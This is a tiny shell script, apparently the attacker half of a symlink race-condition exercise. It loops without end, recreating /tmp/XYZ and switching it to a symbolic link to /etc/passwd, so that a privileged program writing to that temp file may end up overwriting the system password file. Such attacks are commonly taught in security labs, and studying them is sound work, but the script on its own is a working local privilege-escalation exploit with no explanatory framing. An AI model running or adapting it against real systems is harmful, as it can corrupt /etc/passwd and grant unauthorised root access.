#!/bin/sh
while :
do
	rm -f /tmp/XYZ
	touch /tmp/XYZ
	#unlink /tmp/XYZ
	ln -sf /etc/passwd /tmp/XYZ
done

